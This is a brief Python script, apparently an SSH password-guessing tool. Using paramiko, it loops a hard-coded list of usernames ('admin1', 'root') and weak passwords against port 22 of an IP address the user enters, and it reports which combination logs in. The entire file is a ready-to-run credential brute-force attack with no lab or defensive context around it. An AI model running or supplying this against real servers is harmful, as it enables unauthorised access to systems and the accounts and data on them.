import paramiko

def try_ssh_connection(host, port, usernames, passwords):
    for username in usernames:
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password)
                print(f"Success: Username '{username}' with password '{password}' works!")
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                print(f"Failed: Username '{username}' with password '{password}' is incorrect.")
            except Exception as e:
                print(f"Error: {e}")
    return False

# Prompt the user for the SSH server IP address
host = input("Enter the SSH server IP address: ")
port = 22
usernames = ['admin1', 'root']
passwords = ['abc@123', 'Abc@123', 'abc_123', 'Abc_123']

# Try the usernames and passwords
if not try_ssh_connection(host, port, usernames, passwords):
    print("None of the username and password combinations worked.")
